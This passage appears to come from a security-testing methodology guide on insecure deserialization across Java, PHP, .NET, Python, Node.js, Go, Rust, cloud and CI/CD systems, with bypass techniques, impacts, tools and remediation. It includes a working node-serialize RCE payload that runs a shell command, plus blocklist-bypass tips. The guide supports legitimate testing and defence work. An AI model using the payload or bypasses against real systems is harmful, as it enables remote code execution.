    - **.NET:** legacy `BinaryFormatter`/`SoapFormatter` (unsafe/deprecated); Base64 `AAEAAAD/////`
    - **Python:** `pickle` opcodes; unsafe `yaml.load` without `SafeLoader`
    - **Ruby:** `YAML.load` unsafe; use `safe_load`
3.  **Source Review (if available):**
    - **Java:** `ObjectInputStream.readObject`; enable `ObjectInputFilter`, disable Jackson default typing; use allowlists
    - **PHP:** `unserialize()`; file operations that dereference `phar://`
    - **.NET:** avoid `BinaryFormatter`; use `System.Text.Json`
    - **Python:** avoid `pickle` for untrusted data; `yaml.safe_load`
    - **Node.js:** `node-serialize`, `serialize-javascript`, `funcster` with unsafe eval()
    - **Golang:** `encoding/gob` with interface{} type confusion
    - **Ruby:** `Marshal.load()`, `YAML.load()` without `safe_load`
    - **Rust:** `serde` with YAML/bincode, `ron` (Rusty Object Notation)
4.  **Dynamic Analysis:** Intercept and mutate; watch for error stack traces, class names, and timing anomalies.

## Bypass Techniques

1.  **Alternate Gadgets/Classes:** Switch payload chains if blocklists are present.
2.  **Type Confusion:** Change expected types to bypass weak validation.
3.  **Indirect Paths:** Sink data into storage that a different component later deserializes.
4.  **Format Specific:** PHAR wrappers, XML entity tricks, language‑specific unserialize quirks.
5.  **Post‑deserialization Impact:** Abuse magic methods that run before validation.

### Node.js

- **node-serialize**: RCE via `_$$ND_FUNC$$_` IIFE pattern
  ```javascript
  {"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('whoami', function(error, stdout){console.log(stdout)});}()"}
  ```
- **serialize-javascript**: Unsafe eval() when not properly escaped
- **funcster**: Arbitrary function serialization leads to code execution
- **Detection**: Look for `{"_$$ND_FUNC$$_` or serialized function strings in cookies/tokens

### Golang

- **encoding/gob**: Type confusion attacks when using `interface{}` types
  ```go
  // Vulnerable: accepts any type
  var data interface{}
  dec := gob.NewDecoder(buffer)
  dec.Decode(&data)
  ```
- **encoding/json**: Generally safe but Unmarshal into `interface{}` allows unexpected types
- **MessagePack**: Unsafe reflection in `github.com/vmihailenco/msgpack` with custom decoders
- **Mitigation**: Use concrete types, avoid `interface{}` for untrusted data

### Rust

- **serde**: Generally memory-safe but logic bugs possible with custom `Deserialize` implementations
- **bincode**: Binary serialization - ensure versioning and size limits
- **ron** (Rusty Object Notation): Can deserialize into arbitrary types if schema not restricted
- **YAML**: `serde_yaml` with untrusted input can cause DoS via deeply nested structures
- **Best Practice**: Use `#[serde(deny_unknown_fields)]` and explicit type constraints

### Additional Languages

- **Ruby**:
  - `Marshal.load()`: Gadget chains exist (e.g., `Gem::Requirement`, `Gem::RequestSet`)
  - Tools: `Ruby Marshal RCE` (exploit scripts)
- **Python**:
  - `pickle`: Extensive gadget chains, `__reduce__` magic method exploitation
  - `yaml.load()`: Use `yaml.safe_load()` or `yaml.load(data, Loader=yaml.SafeLoader)`
- **Java**:
  - Apache Commons Collections (InvokerTransformer chain)
  - Spring Framework (PropertyPathFactoryBean)
  - Tool: `ysoserial` - generates payloads for 30+ gadget chains

### Container & Kubernetes

- **ConfigMaps/Secrets**: Applications deserializing YAML/JSON from ConfigMaps without validation
- **Admission Webhooks**: Kubernetes admission controllers deserializing `AdmissionReview` objects
  - Test by submitting pods with malicious annotations or labels containing serialized payloads
- **CRD Controllers**: Custom Resource Definitions with unsafe deserialization in reconciliation loops
- **Attack**: Submit malicious Custom Resource → controller deserializes → RCE in cluster

### Message Queues

- **Kafka/RabbitMQ/Redis**: Consumers blindly deserializing messages from queues
  ```python
  # Vulnerable consumer
  msg = consumer.receive()
  data = pickle.loads(msg)  # Attacker controls msg
  ```
- **Testing**: Publish crafted serialized objects to queues if you have producer access
- **Impact**: Compromise all consumers processing the poisoned queue

### Serverless Functions

- **AWS Lambda**: Event payloads deserialized from S3 triggers, SNS, SQS
- **Google Cloud Functions**: HTTP request bodies automatically deserialized
- **Azure Functions**: Blob triggers with automatic deserialization
- **Attack Vector**: Upload malicious serialized object to S3 → Lambda deserializes → RCE in serverless context

### CI/CD Pipelines

- **Jenkins**: Java deserialization in remoting protocol (multiple CVEs)
- **GitLab Runners**: YAML deserialization in `.gitlab-ci.yml` with unsafe anchors/aliases
- **GitHub Actions**: Workflow files with embedded serialized data in custom actions
- **Build Artifacts**: Deserializing cached build objects from untrusted sources

### GraphQL / API Gateways

- **Custom Scalars**: GraphQL custom scalar types deserializing complex objects
- **Input Coercion**: API gateways converting JSON to language objects without validation
- **Batch Operations**: Bulk import/export features deserializing uploaded files

## Vulnerabilities / Impacts

- **RCE via gadget chains**: Execute arbitrary code through chained object instantiation
- **Arbitrary file access**: Read/write files via path traversal in deserialization
- **DoS via resource bombs**: Billion laughs-style attacks with nested objects (zip bombs, XML bombs)
- **Auth bypass via object field tampering**: Modify `is_admin`, `role`, `user_id` fields in session objects
- **Downstream SQLi with tainted fields**: Deserialized objects used in SQL queries without sanitization
- **Memory exhaustion**: Allocate large data structures during deserialization
- **Type juggling attacks**: Language-specific type coercion vulnerabilities

## Methodologies

- Identify → Format → Mutate/Fuzz → Exploit chain → Verify impact safely
- Tools: `ysoserial`, `phpggc`, `ysoserial.net`, Burp Deserialization Scanner, Semgrep rules for dangerous sinks, `marshalsec`, gadget inspectors.

## Remediation Recommendations

1.  Avoid deserializing untrusted input; use JSON with schemas.
2.  Verify integrity first (HMAC/signature) and only then deserialize; reject on mismatch.
3.  Use safe, specific serializers without polymorphic typing; implement allowlists.
4.  Isolate deserialization code under least privilege and sandboxing; timeouts/memory limits.
5.  Keep libraries updated; monitor for anomalies.
